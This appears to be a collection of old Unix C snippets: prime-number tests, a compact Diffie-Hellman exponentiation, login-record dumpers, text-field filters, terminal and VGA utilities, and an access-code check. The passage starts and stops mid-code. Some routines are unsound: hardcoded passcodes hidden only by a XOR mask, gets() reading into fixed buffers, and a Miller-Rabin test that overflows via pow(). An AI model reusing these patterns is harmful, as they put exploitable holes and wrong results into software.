	for ( lp = labuf ; lp->lc_code != -1 ; ++lp )
		if ( strcmp (what, lp->lc_name) == 0 )
			(*lp->lc_func) () ;
}

main (argc, argv) char * * argv ; {

	char name [MAXNAMSIZ] ;

	if (--argc) {
		while (*++argv) {
			if ( **argv == '-' ) {
				switch ( *((*argv)+1) ) {
					case '?' : labusage () ; break ;
					case '-' : ++stdinflag ; break ;
					default  : labusage () ; break ;
				}
			} else {
				labit (*argv) ;
			}
		}
	} else {
		while ( fgets (name, MAXNAMSIZ, stdin) != NULL )
			labit (name) ;
	}

	if (stdinflag)
		while ( fgets (name, MAXNAMSIZ, stdin) != NULL )
			labit (name) ;

}

/*	____	____	____	____	____	____	____	____	*/

# ifdef COMMENT

/*
	miller-rabin
	improve : use gethrtime ; sto #'s found in array results[]
				call/test again till results remain constant
				at least by 3 successive calls
*/

/*  main.c
 *  Author: Patrick Aland <paland@stetson.edu>
 *  Compile infoz: gcc -o main -lm millerrabin.c
 *  Run Infoz: Just run it. It's a simply demonstration.
 *  The code is kinda sloppy. Sorry Wayne.
 */
#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#define ulong unsigned long

int millerrabin(ulong p);

int main(int argc, char** argv)
{
	ulong count, p;
	srand(time(NULL));
	p=100;
	for(count=3;count<p;count+=2)
	{
		if(millerrabin(count) == 1)
		{
			printf("%d\n", count);
		}
	}

}

int millerrabin(ulong p)
{
	ulong a,b,m,z,j;
	int times;
	short rc;
	rc=-1;
	times=0;
	m=p-1;
	b=0;
	while(!(m%2))
	{
		b++;
		m=m/2;
	}
	/* We shall do the test five times to get a better confidence. */
	while(times<5 && rc!=0)
	{
		j=0;
		a=0;
		while( a<2 || a>(p-1) )
		{
			a = rand()%p;
		}
		z = pow(a,m);
		z = z%p;
		if( z==1 || z==(p-1) )
		{
			rc=1;
		}
		while(rc < 0)
		{
			if(j>0 && z==1)
			{
				rc=0;
			}
			else
			{
				j++;
				if( (j<b) && z!=(p-1))
				{
					z=pow(z,2);
					z=z%p;
				}
				else if(z == (p-1))
				{
					rc = 1;
				}
				else if(j==b)
				{
					rc=0;
				}
			}
		}
		times++;
	}
	return rc;
}

/*	____	____	____	____	____	____	____	____	*/

/*
	combine v1+v2 in a single fun()
	time & show both (steps & hrtime)
*/

/* Test for primes v1 */
#include <stdio.h>

int isprime(int n) {
	if (n > 2) {
		int i, m = n/2;
		for (i = 2; i < m; i++)
			if (n%i == 0)
				return 0;
	}
	return 1;
}

int main(int argc, char *argv[]) {
	int i;

	for (i = 1; i < argc; i++) {
		int n;
		sscanf(argv[i], "%d", &n);
		if (isprime(n))
			printf("%d is a prime\n", n);
		else
			printf("%d is not a prime\n", n);
	}
	return 0;
}

/* Test for primes v2 */
#include <stdio.h>
#include <math.h>

int isprime(int n) {
	if (n > 2 && n%2 != 0) {
		int i, m = sqrt(n) + 1;
		for (i = 3; i < m; i += 2)
			if (n%i == 0)
				return 0;
	}
	return 1;
}

int main(int argc, char *argv[]) {
	int i;

	for (i = 1; i < argc; i++) {
		int n;
		sscanf(argv[i], "%d", &n);
		if (isprime(n))
			printf("%d is a prime\n", n);
		else
			printf("%d is not a prime\n", n);
	}
	return 0;
}

/*	____	____	____	____	____	____	____	____	*/

/* random.h */
extern int random(void); /* returns a random number in the range 0..2147483646. */
extern int seed; /* Initial seed for random(); default 0. */
/*
Random number generator; from Press et al.,
Numerical Recipes in C, 2/e, 278-9.
*/
#include "random.h"

int seed = 0;

int random(void) {
	int k;

	seed ^= 123459876;
	k = seed/127773;
	seed = 16807*(seed - k*127773) - 2836*k;
	if (seed < 0)
		seed += 2147483647;
	k = seed;
	seed ^= 123459876;
	return k;
}

/*				                     _______________________________
 *									|								|
 *									|	diffie-hellman v?.? ...		|
 *				                    |_______________________________|
 */

#include <stdio.h>  /* Usage: dh base exponent modulus */

typedef unsigned char u;

u m[1024],g[1024],e[1024],b[1024];

int n,v,d,z,S=129;

a(u *x,u *y,int o){
	d=0;
	for(v=S;v--;){
		d+=x[v]+y[v]*o;
		x[v]=d;
		d=d>>8;
	}
}

s(u *x){
	for(v=0;(v<S-1)&&(x[v]==m[v]);)v++;
	if(x[v]>=m[v])a(x,m,-1);
}

r(u *x){
	d=0;
	for(v=0;v<S;){
		d|=x[v];
		x[v++]=d/2;
		d=(d&1)<<8;
	}
}

M(u *x,u *y){
	u X[1024],Y[1024];
	bcopy(x,X,S);
	bcopy(y,Y,S);
	bzero(x,S);
	for(z=S*8;z--;){
		if(X[S-1]&1){
			a(x,Y,1);
			s(x);
		}
		r(X);
		a(Y
		    ,Y,1);
		s(Y);
	}
}

h(char *x,u *y){
	bzero(y,S);
	for(n=0;x[n]>0;n++){
		for(z=4;z--;)a(y,y
		    ,1);
		x[n]|=32;
		y[S-1]|=x[n]-48-(x[n]>96)*39;
	}
}

p(u *x){
	for(n=0;!x[n];)n++;
	for(;n<S;n++)printf("%c%c",48+x[n]/16+(x[n]>159)*7,48+(x[n]&15)+7*((x[n]&15)>9));
	printf("\n");
}

main(int c,char **v){
	h(v[1],g);
	h(v[2],e);
	h(v[3],m);
	bzero(b,S);
	b[S-1]=1;
	for(n=S*8;n--;){
		if(e[S-1]&1)M(b,g);
		M(g,g);
		r(e);
	}
	p(b);
}

/*				                     _______________________________
 *									|								|
 *									|	dump [uw]tmpx ...			|
 *				                    |_______________________________|
 */

# include <utmpx.h>
# include <time.h>
# include <stdio.h>

# define SIMPLE

char * typtxt [] = {
	"EMPTY",
	"RUNLVL",
	"BOOT",
	"OLDTM",
	"NEWTM",
	"INIT",
	"LOGIN",
	"USER",
	"DEAD",
	"ACCT",
	"UKNOWN"
} ;

showxtime (tloc) time_t tloc ; {

	struct tm * tp ;

	tp = localtime (&tloc) ;

	printf ("%04d%02d%02d%02d%02d%02d|",
		tp->tm_year + 1900, tp->tm_mon + 1, tp->tm_mday,
		tp->tm_hour, tp->tm_min, tp->tm_sec) ;
}

dumput () {

	struct utmpx * utxp ;
	int typ ;

	setutxent () ;

	printf ("USER____|ID__|LINE________|PID__|TYPE__|TIME__________|HOST____________________\n") ;

	while ( (utxp = getutxent ()) != NULL ) {

		typ = utxp->ut_type ;

		if ( typ < 0 || typ > UTMAXTYPE )
			typ = 10 ;

# ifdef SIMPLE

		printf ("%-8.8s|", utxp->ut_user) ;
		printf ("%-4.4s|", utxp->ut_id) ;
		printf ("%-12.12s|", utxp->ut_line) ;
		printf ("%5d|", utxp->ut_pid) ;
		printf ("%-6.6s|", typtxt[typ]) ;
		showxtime (utxp->ut_xtime) ;
		printf ("%-24.24s\n", utxp->ut_host) ;

# endif

	}

	endutxent () ;
}

main () {

	utmpxname (UTMPX_FILE) ;
	dumput () ;
	utmpxname (WTMPX_FILE) ;
	dumput () ;
}

/*				                     _______________________________
 *									|								|
 *									|	dump [uw]tmp ...			|
 *				                    |_______________________________|
 */

# include <utmp.h>
# include <time.h>
# include <stdio.h>

# define SIMPLE

char * typtxt [] = {
	"EMPTY",
	"RUN_LVL",
	"BOOT_TIME",
	"OLD_TIME",
	"NEW_TIME",
	"INIT_PROC",
	"LOGIN_PROC",
	"USER_PROC",
	"DEAD_PROC",
	"ACCOUNTING",
	"UNKNOWN"
} ;

dumput () {

	struct utmp * utp ;
	int typ ;

	setutent () ;

	printf ("USER____|ID__|LINE________|PID___|TYPE______|TIME____________________\n") ;

	while ( (utp = getutent ()) != NULL ) {

		typ = utp->ut_type ;

		if ( typ < 0 || typ > UTMAXTYPE )
			typ = 10 ;

# ifdef SIMPLE

		printf ("%-8.8s|", utp->ut_user) ;
		printf ("%-4.4s|", utp->ut_id) ;
		printf ("%-12.12s|", utp->ut_line) ;
		printf ("%6d|", utp->ut_pid) ;
		printf ("%-10.10s|", typtxt[typ]) ;
		printf ("%s", ctime (&utp->ut_time)) ;

# endif

	}

	endutent () ;
}

main () {

	utmpname (UTMP_FILE) ;
	dumput () ;
	utmpname (WTMP_FILE) ;
	dumput () ;
}

/*	____	____	____	____	____	____	____	____	*/

/* alarm clock */

# include <unistd.h>
# include <signal.h>

void wakeup (signo) {

	puts ("yawn") ;
	exit (1) ;
}

main () {

	int i = 0 ;

	signal (SIGALRM, wakeup) ;
	alarm (3) ;

	while (++i) {
		if (i % 100000 == 0)
			printf ("%d\n", i) ;
	}
}

/*				                     _______________________________
 *									|								|
 *									|	pragma ident ...			|
 *				                    |_______________________________|
 */

	/* inspect (sol) : mcs -p progname */

# ifdef PRAGMA_H

# pragma	ident	"@(#)lixo.h 1.2 2001/02/04 avrb"

# define	UEBA	"ueba!"

# endif /* PRAGMA_H */

/*	____	____	____	____	____	____	____	____	*/

# ifdef PRAGMA_C

# include	"lixo.h"

# pragma	ident	"@(#)lixo.c 3.4 2001/02/04 avrb"

main () {

	puts (UEBA) ;
}

# endif /* PRAGMA_C */

/*	____	____	____	____	____	____	____	____	*/

/* prime3.c */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>

#define HEAPSIZE 78500  /* Size of the heap.  The value 78500 is sufficient
                           to cover numbers up to one trillion */

#define BASE 1000000000

#define SKIP 1000000    /* Print every millionth prime */

#define compareMN(i,j) (((i).b==(j).b)?(int)((i).a-(j).a):(int)((i).b-(j).b))

#define qaddMN(m,n) if((((m)->a)+=(n))>BASE){((m)->a)-=BASE;((m)->b)++;}

#define NPOS(a,b) (a=(((a)==(b))?0:(a)+1))

short step[1658880];  /* Increments to miss multiples of 2-22 */

struct mn {
    unsigned int a,b;
};

/* Heap structure */
struct heapEle {
    unsigned int 
        base,    /* A prime number */
        hstp;    /* Position in step */
    struct mn  mult;  /* A multiple of the prime number, larger than num  */
} *heap[HEAPSIZE], ele[HEAPSIZE];

void skipTo(struct mn, struct mn *, unsigned int *, unsigned int);
void addMN(struct mn *, unsigned int);
int lcnt=0;

int main() {
    register struct heapEle *tmp;
    register unsigned int a, loc,top;
    unsigned int pos=0,count=9,prev=23,start;
    struct mn num, max,startAt;
    FILE *mn2;

    /* Set up increment table */
    initStep();

    /* Allocate memory for heap */
    for(a = 0; a < HEAPSIZE; a++)
        heap[a] = &ele[a];

    /* Initialize heap to 1 element */
    heap[0]->mult.a = heap[0]->mult.b = 0;
    heap[1]->base = 23;
    max.a = heap[1]->mult.a = 529; 
    max.b = heap[1]->mult.b =   0;
    heap[1]->hstp = 1658879;
    num.b = 0;
    top = 2;
    num.a = 2; printMN(num);
    num.a = 3; printMN(num);
    num.a = 5; printMN(num);
    num.a = 7; printMN(num);
    num.a = 11; printMN(num);
    num.a = 13; printMN(num);
    num.a = 17; printMN(num);
    num.a = 19; printMN(num);
    num.a = 23; printMN(num);
    num.a = 29;

    /* Main loop.  Go from 29 to max, skipping multiples of 2-22 */
    while(compareMN(num,max) < 1) {

        /* If number is at the top of heap, it is not prime */
        if (compareMN(num,heap[1]->mult) == 0) {

            /* Downheap all structs where mult == num */
            do {
                tmp = heap[1]; loc = 1; a = 2;
                /* Set mult to next multiple of base */
                qaddMN(&(tmp->mult),tmp->base * 
                    (unsigned int)step[NPOS(tmp->hstp,1658879)]);

                /* Downheap value */
                do {
                    /* Select smaller child */
                    if (compareMN(heap[a+1]->mult,heap[a]->mult) < 0) a++;
                    /* If child is smaller, swap parent and child */
                    if (compareMN(tmp->mult,heap[a]->mult) > 0) 
                        heap[loc] = heap[a];
                    /* Otherwise, downheap is done */
                    else break;
                    loc = a;

                /* Until we reach the top of the heap */
                } while((a = loc*2) < top); 
                heap[loc] = tmp;
            } while(compareMN(heap[1]->mult,num) == 0);
        }
        /* If number is not at the top of the heap, it is prime */
        else {
            printMN(num);
            /* If the heap is not full, add value */
            if (top < HEAPSIZE) {
                /* Initialize heap element */
                heap[top]->base = num.a;
                heap[top]->hstp = pos;
                loc = top++;
                qaddMN(&max,(num.a-prev) * (num.a+prev));
                prev = num.a;
                heap[loc]->mult.a = max.a;
                heap[loc]->mult.b = max.b;

                /* Upheap */
                tmp = heap[loc];
                while(compareMN(tmp->mult,heap[a=loc>>1]->mult) < 0) {
                    heap[loc] = heap[a];
                    loc = a;
                }
                heap[loc] = tmp;

            }
        }
        addMN(&num,(unsigned int)step[NPOS(pos,1658879)]);
    }
    return 0;
}

initStep() {
    unsigned int so[5760],i,prev=23,count=0;
    unsigned int inc=4,n1=289,n2=361,p1=5757,p2=5758;

    for(i = 29; count < 5760; i += (inc ^= 6)) {
        if ((i % 5) && (i % 7) && (i % 11) && (i % 13)) {
            so[count++] = i - prev;
            prev = i;
        }
    }

    prev = 23; count = inc = 0;
    for(i = 29; count < 1658880; i += so[NPOS(inc,5759)]) {
        if (i == n1) {
            n1 += 17 * so[NPOS(p1,5759)];
            if (i == n2)
                n2 += 19 * so[NPOS(p2,5759)];
        }
        else if (i == n2)
            n2 += 19 * so[NPOS(p2,5759)];
        else {
            step[count++] = (short)(i - prev);
            prev = i;
        }
    }
}


/* Add n to mult-number.  Use qaddMN unless n > BASE. */
void addMN(struct mn *m, unsigned int n) {
    while(n > BASE) {
        m->b++;
        n -= BASE;
    }
    m->a += n;
    while (m->a > BASE) {
        m->b++;
        m->a -= BASE;
    }
}

int printMN(struct mn n) {
    static int num=0;
    if (++num == SKIP) {
        if (n.b < 4) printf("%u\n",n.a + n.b * BASE);
        else printf("%u%09u\n",n.b,n.a);
        num = 0;
    }
    return 0;
}

/*	____	____	____	____	____	____	____	____	*/

/* prime4.c */

#include <stdio.h>
#include <stdlib.h>
#include <math.h>

#define out(z) printf("%d\n", (int)(z))

void main (int argc, char *argv[])
{
	int i, j, n = argc > 1 ? abs(atoi(argv[1])) : 0, half = (n - 1) / 2, root = sqrt(n);
	char *x = (char *) malloc(half);
	int count = 1, knocks = 0, dupls = 0;

	switch (n)
	{
		case 2: out(2);
		case 0: case 1: return;
		default: out(2);
	}

	for (i = half; i; x[--i] = 1);

	while ((n = 2 * i + 3) <= root)
		if (x[i++])
			for (x[j = (n * n - 3) / 2] = 0; j < half; x[j += n] = 0);

	for (i = 0; i < half;  i++)
		if (x[i])
			out(2 * i + 3);
}

/*	____	____	____	____	____	____	____	____	*/

/* prime5.c */

#include <stdio.h>

main () {
     int possible_prime, n, possible_divisor;
     
     printf( "Input n: ");
     scanf( "%d", &n );
     printf( "Primes <= %d:\n", n );

     for ( possible_prime = 2; possible_prime <= n;
               possible_prime++ ) {
          /* try to find a divisor of possible_prime */
          for ( possible_divisor = 2; 
               possible_divisor < possible_prime;
               possible_divisor++ )
               if ( possible_prime % possible_divisor == 0 )
                    /* found a divisor so possible_prime is not 
                                                        prime */
                    break;
          if ( possible_divisor == possible_prime )
               /* exhausted possible divisors, so possible_prime 
                   is prime */
               printf( "%d\n", possible_prime );
     }
}

/*	____	____	____	____	____	____	____	____	*/

/*
 * endian - Determine the byte order of a long
 *
 * Big Endian:      Amdahl, 68k, Pyramid, Mips, Sparc, ...
 * Little Endian:   Vax, 32k, Spim (Dec Mips), i386, i486, ...
 */

#include <stdio.h>

#include <unistd.h>

/* byte order array */

char byte[8] = { (char)0x12, (char)0x36, (char)0x48, (char)0x59,
                 (char)0x01, (char)0x23, (char)0x45, (char)0x67 };

int main (void) {

    int *intp = (int *)byte;

#if defined(DEBUG)
    short *shortp = (short *)byte;
    long *longp = (long *)byte;

    printf("byte: %02x %02x %02x %02x %02x %02x %02x %02x\n",
        byte[0], byte[1], byte[2], byte[3],
        byte[4], byte[5], byte[6], byte[7]);
    printf("short: %04x %04x %04x %04x\n",
        shortp[0], shortp[1], shortp[2], shortp[3]);
    printf("int: %08x %08x\n",
        intp[0], intp[1]);
    printf("long: %08x %08x\n",
        longp[0], longp[1]);
#endif

    /* Print the standard <machine/endian.h> defines */
    printf("#define BIG_ENDIAN\t4321\n");
    printf("#define LITTLE_ENDIAN\t1234\n");

    /* Determine byte order */
    if (intp[0] == 0x12364859) {
        /* Most Significant Byte first */
        printf("#define CALC_BYTE_ORDER\tBIG_ENDIAN\n");
    } else if (intp[0] == 0x59483612) {
        /* Least Significant Byte first */
        printf("#define CALC_BYTE_ORDER\tLITTLE_ENDIAN\n");
    } else {
        fprintf(stderr,
            "Unknown int Byte Order, set CALC_BYTE_ORDER in Makefile\n");
        exit(1);
    }
    exit(0);
}

		/*======================================================*/
		/*		dump last login records ...						*/
		/*======================================================*/

# include <sys/types.h>

# include <stdio.h>

# include <time.h>
# include <lastlog.h>

char pn [16] = "dumplastlog" ;
char fn [32] = "/var/adm/lastlog" ;

main () {

	struct lastlog llbuf ;
	int fd ;

	fd = open (fn, 0) ;

	if (fd < 0) {
		fprintf (stderr, "%s : can't open %s\n", pn, fn) ;
		return ;
	}

	while ( read ( fd , &llbuf, sizeof (llbuf) ) > 0 ) {
		printf ("[%8s] [%16s] %s", llbuf.ll_line, llbuf.ll_host,
				ctime (&llbuf.ll_time)) ;
	}

	close (fd) ;
}

/*				                     _______________________________
 *									|								|
 *									|	test-and-move field ...		|
 *				                    |_______________________________|
 */

/*
 *	tamfld : test-and-move field
 *
 *	use : tamfld reclen type-pos type-val field-start field-end < infile > outfile
 */

# include <stdio.h>

main (argc, argv) char * * argv ; {

	int reclen, typpos, typval, fldsta, fldend ;
	char linbuf [8192] ;
	char fldspc [32] ;

	if (argc == 1) {
		fprintf (stderr, "use : tamfld reclen type-pos type-val field-start field-end < infile > outfile\n") ;
		exit (1) ;
	}

	memset (fldspc, ' ', 30) ;

	reclen = atoi ( *(argv+1) ) ;
	typpos = atoi ( *(argv+2) ) ;
	typval = **(argv+3) ;
	fldsta = atoi ( *(argv+4) ) ;
	fldend = atoi ( *(argv+5) ) ;

	while ( gets (linbuf) != NULL ) {

		if ( linbuf[typpos] == typval ) {
			memcpy ( &linbuf[reclen] , &linbuf[fldsta] , fldend-fldsta+1 ) ;
			memcpy ( &linbuf[fldsta] , fldspc , fldend-fldsta+1 ) ;
		} else {
			memcpy ( &linbuf[reclen] , fldspc , fldend-fldsta+1 ) ;
		}

		linbuf[reclen+(fldend-fldsta+1)] = '\0' ;

		puts (linbuf) ;
	}
}

/*				                     _______________________________
 *									|								|
 *									|	test-and-copy field ...		|
 *				                    |_______________________________|
 */

/*
 *	tacfld : test-and-copy field
 *
 *	use : tacfld reclen type-pos type-val field-start field-end < infile > outfile
 */

# include <stdio.h>

main (argc, argv) char * * argv ; {

	int reclen, typpos, typval, fldsta, fldend ;
	char linbuf [8192] ;
	char fldspc [32] ;

	if (argc == 1) {
		fprintf (stderr, "use : tacfld reclen type-pos type-val field-start field-end < infile > outfile\n") ;
		exit (1) ;
	}

	memset (fldspc, ' ', 30) ;

	reclen = atoi ( *(argv+1) ) ;
	typpos = atoi ( *(argv+2) ) ;
	typval = **(argv+3) ;
	fldsta = atoi ( *(argv+4) ) ;
	fldend = atoi ( *(argv+5) ) ;

	while ( gets (linbuf) != NULL ) {

		if ( linbuf[typpos] == typval ) {
			memcpy ( &linbuf[reclen] , &linbuf[fldsta] , fldend-fldsta+1 ) ;
		} else {
			memcpy ( &linbuf[reclen] , fldspc , fldend-fldsta+1 ) ;
		}

		linbuf[reclen+(fldend-fldsta+1)] = '\0' ;

		puts (linbuf) ;
	}
}

/*				                     _______________________________
 *									|								|
 *									|	append field ...			|
 *				                    |_______________________________|
 */

/*
 *	appfld : append field (no test)
 *
 *	use : appfld reclen field-start field-end < infile > outfile
 */

# include <stdio.h>

main (argc, argv) char * * argv ; {

	int reclen, fldsta, fldend ;
	char linbuf [8192] ;

	if (argc == 1) {
		fprintf (stderr, "use : appfld reclen field-start field-end < infile > outfile\n") ;
		exit (1) ;
	}

	reclen = atoi ( *(argv+1) ) ;
	fldsta = atoi ( *(argv+2) ) ;
	fldend = atoi ( *(argv+3) ) ;

	while ( gets (linbuf) != NULL ) {

		memcpy ( &linbuf[reclen] , &linbuf[fldsta] , fldend-fldsta+1 ) ;

		linbuf[reclen+(fldend-fldsta+1)] = '\0' ;

		puts (linbuf) ;
	}
}

/*				                     _______________________________
 *									|								|
 *									|	check max open files ...	|
 *				                    |_______________________________|
 */

# include <stdio.h>
# include <fcntl.h>

# define	MAXFD	4096

fdck () {

	int x , rd , fdk = 0 ;
	int fdb [MAXFD] ;
	char nam [80] ;

	printf ("+ creating files ... ") ;
	fflush (stdout) ;

	for ( x = 0 ; x < MAXFD ; ++x ) {
		sprintf (nam, "/tmp/fdck%04d", x) ;
		rd = open (nam, O_CREAT | O_WRONLY) ;
		if (rd < 0)
			break ;
		++fdk ;
		fdb[x] = rd ;
	}

	printf ("done \n") ;

	printf ("+ closing files ... ") ;
	fflush (stdout) ;

	for ( x = 0 ; x < fdk ; ++x )
		close (fdb[x]) ;

	printf ("done \n") ;

	printf ("+ removing files ... ") ;
	fflush (stdout) ;

	for ( x = 0 ; x < fdk ; ++x ) {
		sprintf (nam, "/tmp/fdck%04d", x) ;
		rd = unlink (nam) ;
	}

	printf ("done \n") ;

	printf ("+ maximum open files = %d \n", fdk) ;
}

main () {

	fdck () ;
}

/*				                     _______________________________
 *									|								|
 *									|	check raw size (no stat)	|
 *				                    |_______________________________|
 */

# include <stdio.h>

long szck (nam) char * nam ; {

	int fd = open (nam, 0) ;
	long x ;

	if (fd < 0)
		return -1L ;

	x = lseek (fd, 0L, SEEK_END) ;
	close (fd) ;
	return x ;
}

main (argc, argv) char * * argv ; {

	char * tp ;

	while (--argc) {
		tp = *++argv ;
		printf ("szck(%s)=(%ld) \n", tp, szck (tp)) ;
	}
}

/*	____	____	____	____	____	____	____	____	*/

/*
 *	test ltomask() , ltokmg() , lltokmgtpe()
 */

main (argc, argv) char * * argv ; {

	long x ;

	while (--argc) {
		x = atol (*++argv) ;
		printf ("x 0x%08lx l2m 0x%08lx \n", x, ltomask(x)) ;
	}
}

main (argc, argv) char * * argv ; {

	long x ;

	while (--argc) {
		x = atol (*++argv) ;
		printf ("x = %ld (%s) \n", x, ltokmg (x)) ;
	}

	printf ("bug (%s) (%s) (%s) \n",
			ltokmg (123L), ltokmg (456L), ltokmg (789L)) ;
}

/* test lltokmgtpe & xlltoa */
# include <stdlib.h>
/* cc -DSOLARIS -o k k.c stdmisc.c */
main (argc, argv) char * * argv ; {
	long long x = 1 ;
	int n = atoi (*(argv+1)) ;
	while (n--) {
# ifdef ORIG
		printf ("%s %21lld %32s \n", lltokmgtpe (x), x, xlltoa (x, 32, 0x08)) ;
# endif
		printf ("%s\t%28s\n", lltokmgtpe (x), xlltoa (x, 32, 0x08)) ;
		x <<= 1 ;
	}
}

/*	____	____	____	____	____	____	____	____	*/

/*
 *	test maketime()
 */

# include <time.h>

main (argc, argv) char * * argv ; {

	long tloc ;
	int year, month, day, hour, minute, second ;

	sscanf ( *(argv+1) , "%d/%d/%d,%d:%d:%d" ,
		&year, &month, &day, &hour, &minute, &second ) ;

	tloc = maketime ( year, month, day, hour, minute, second ) ;

	printf ( "input ...... = %4d/%02d/%02d,%02d:%02d:%02d \n",
		year, month, day, hour, minute, second ) ;

	printf ( "ctime     = %s" , ctime ( &tloc ) ) ;
	printf ( "localtime = %s" , asctime ( localtime ( &tloc ) ) ) ;
	printf ( "gmtime    = %s" , asctime ( gmtime ( &tloc ) ) ) ;
}

/*	____	____	____	____	____	____	____	____	*/

/* test double significant digits output ... */

# include <stdio.h>
# include <stdlib.h>

main (argc, argv) char * * argv ; {

	double x ;

	while (--argc) {
		x = atof (*++argv) ;
		printf ("x (%f) (%3.1f) (%1.1f) \n", x, x, x) ;
		printf ("x (%f) (%3.0f) (%1.0f) \n", x, x, x) ;
		printf ("x (%f) (%3f) (%1f) \n", x, x, x) ;
		printf ("x (%3.3f) (%5.3f) (%7.3f) \n", x, x, x) ;
		printf ("ceil(x)=(%3.1f) floor(x)=(%3.1f) rint(x)=(%3.1f) \n",
				ceil(x), floor(x), rint(x)) ;
	}
}

/*				                     _______________________________
 *									|								|
 *									|	path name dismantler ...	|
 *				                    |_______________________________|
 */

# define	USE_STDIO

# define	USE_STDASC

# include	"abc.h"

char * pnd (pn) char * pn ; {

	static char * pnp = NULL ;
	static char   buf[512] ;
	static char * bp = buf ;

	if (pnp == NULL)
		pnp = pn ;

	if (*pnp == NUL) {
		pnp = NULL ;
		bp = buf ;
		return (pnp) ;
	}

	if ((pnp == pn) && (*pnp == DIRSEP)) {
		*bp++ = *pnp++ ;
	} else {
		if (*pnp == DIRSEP)
			*bp++ = *pnp++ ;
		while (*pnp && (*pnp != DIRSEP))
			*bp++ = *pnp++ ;
	}

	*bp = NUL ;
	return (buf) ;
}

main (argc, argv) char * * argv ; {

	char * p , * pnd () ;

	while (*++argv) {
		printf ("(%s)\n", *argv) ;
		while ((p = pnd (*argv)) != NULL)
			printf ("--> %s\n", p) ;
	}
}

/*				                     _______________________________
 *									|								|
 *									|	path name splitter ...		|
 *				                    |_______________________________|
 */

# define	USE_STDIO

# define	USE_STDASC
# define	USE_STDTYP
# define	USE_STDMISC

# include	"abc.h"

char * pns (pn) char * pn ; {

	static char * pnp = NULL ;
	static char   buf[512] ;
	static char * bp = buf ;
	int    delta = 1 ;

	if (pnp == NULL)
		pnp = pn ;

	if (*pnp == NUL) {
		pnp = NULL ;
		bp = buf ;
		return (pnp) ;
	}

	if ((pnp == pn) && (*pnp != DIRSEP))
		delta = 0 ;

	if (*pnp == DIRSEP)
		*bp++ = *pnp++ ;
	while (*pnp && (*pnp != DIRSEP))
		*bp++ = *pnp++ ;

	*bp = NUL ;
	return lastname (buf) - delta ;
}

main (argc, argv) char * * argv ; {

	char * p , * pns () ;

	while (*++argv) {
		printf ("(%s)\n", *argv) ;
		while ((p = pns (*argv)) != NULL)
			printf ("--> %s\n", p) ;
	}
}

/*	____	____	____	____	____	____	____	____	*/

/* xkbhit.c */

#	include		<fcntl.h>

int tfd ;

main () {

	int x ;
	long k = 0L ;

	tfd = open ("/dev/tty", 2) ;

	for (;;) {
		if ((x = xkbhit()) > 0) {
			printf ("algo...\n") ;
			if (x == 'X')
				return ;
		} else
			printf ("nada...%ld\r", k++) ;
	}
}

/*	 _______________________________________________
 *	|						|
 *	|	portable kbhit sense test ...		|
 *	|_______________________________________________|
 */

int xkbhit () {

	char b [ 40 ] ;
	register int i = 0 ;
	register char * p = b ;
	register int r ;
	int fc_ant ;

	fc_ant = fcntl (tfd, F_GETFL, 0) ;
	fcntl (tfd, F_SETFL, fc_ant | O_NDELAY) ;

	r = read (tfd, p+i, 1) ;

	if (r <= 0) {
		fcntl (tfd, F_SETFL, fc_ant) ;
		return -1 ;
	}

	if (*(p+i) == 27) { /* ESC : get more chars ... */

gmc :
		++i ;
		r = read (tfd, p+i, 1) ;

		if (r == 0) {
			fcntl (tfd, F_SETFL, fc_ant) ; --i ;
			if ( i > 0 ) {
				b[i+1] = '\0' ;
				return 255 ;
			}
			return *(p+i) ;
		}
		if (r < 0)
			return -1 ;
		goto gmc ;

	}

	return *(p+i) ;

} /* endof xkbhit() */

/*	____	____	____	____	____	____	____	____	*/

/* sw25.c */

# include <fcntl.h>
# include <sys/machdep.h>
main () {
    int vfd, x ;

    vfd = open ("/dev/vga", O_WRONLY) ;
    x = ioctl (vfd, SW_VGA80x25, 0) ;
    close (vfd) ;
}

/*	____	____	____	____	____	____	____	____	*/

/* swe25.c */

# include <fcntl.h>
# include <sys/machdep.h>
main () {
    int vfd, x ;

    vfd = open ("/dev/vga", O_WRONLY) ;
    x = ioctl (vfd, SW_ENHC80x25, 0) ;
    close (vfd) ;
}

/*	____	____	____	____	____	____	____	____	*/

/* sw43.c */

# include <fcntl.h>
# include <sys/machdep.h>
main () {
    int vfd, x ;

    vfd = open ("/dev/vga", O_WRONLY) ;
    x = ioctl (vfd, SW_ENHC80x43, 0) ;
    close (vfd) ;
}

/*_______________________________________________________________________
 *_____	ac + access code validation ... _________________________________
 */

# define  ACNT		8
# define  ACBYT		*(acp+acs)

# ifndef  ACMSG
# define  ACMSG		"ac: "
# endif   ACMSG

# ifndef  ACOK
# define  ACOK		acp = (char *) 0
# endif   ACOK

# ifndef  ACNOK
# define  ACNOK		exit (31)
# endif   ACNOK

# define  MC(X)		( X ^ 0xa5 )
# define  MB(X)		( ( (unsigned) X ) ^ 0xa5 )

static unsigned char acl [ACNT] [12] = {

{MC('o'),MC('m'),                                    0,0,0,0,0,0,0,0,0,0 },
{MC('b'),MC('o'),MC('u'),MC('s'),MC('e'),                  0,0,0,0,0,0,0 },
{MC('g'),MC('a'),MC('u'),MC('c'),MC('h'),MC('e'),            0,0,0,0,0,0 },
{MC('c'),MC('y'),MC('m'),MC('e'),MC('r'),MC('i'),MC('a'),MC('n'),0,0,0,0 },
{MC('d'),MC('r'),MC('a'),MC('y'),MC('f'),MC('w'),MC('t'),MC('o'),0,0,0,0 },
{MC('k'),MC('t'),MC('a'),MC('b'),MC('l'),MC('w'),MC('f'),MC('t'),0,0,0,0 },
{MC('k'),MC('l'),MC('o'),MC('p'),MC('s'),MC('t'),MC('r'),MC('w'),0,0,0,0 },
{MC('k'),MC('t'),MC('a'),MC('b'),MC('l'),MC('y'),MC('f'),MC('t'),0,0,0,0 }

} ;

register int aci ;
register int acs ;
register char * acp = getac (ACMSG) ;

for ( aci = 0 ; aci < ACNT ; ++aci ) {
	for ( acs = 0 ; ACBYT ; ++acs ) {
		if ( acl [aci] [acs] != MB (ACBYT) )
			break ;
	}
	if ( acl [aci] [acs] == ACBYT )
		aci = 63 ;
}

if (aci < 63) {
	ACNOK ;
} else {
	ACOK ;
}

/*_______________________________________________________________________
 *_____	cac + check access code ... _____________________________________
 */

# include	"abc.h"

# ifdef   DOS

# include <stdio.h>
# include <conio.h>
# include <stdlib.h>

# endif   /* DOS */

# define  ACMSG		"# "

# ifdef   DOS

# define  ACNOK		cputs ("Drop Dead ! Get Lost !\r\n") ; exit (31)

# else    /* UNIXENIX */

